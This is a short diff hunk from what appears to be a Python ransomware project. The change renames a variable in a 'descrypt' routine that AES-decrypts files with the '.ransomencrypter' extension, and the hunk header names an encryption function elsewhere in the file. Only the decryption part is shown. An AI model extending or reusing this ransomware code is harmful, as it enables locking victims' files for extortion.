@@ -49,10 +49,10 @@ def criptografando():
 def descrypt(decrypt_file):
     try:
         for arquivo in glob.glob('*.ransomencrypter'):
-            keybytes = decrypt_file.encode()
+            decryptf = decrypt_file.encode()
             name_arquivo = open(arquivo, 'rb')
             data_arqui = name_arquivo.read()
-            akey = keybytes
+            akey = decryptf
             aaes = pyaes.AESModeOfOperationCTR(akey)  # gera a decriptografia
             decrypt_data = aaes.decrypt(data_arqui)
 
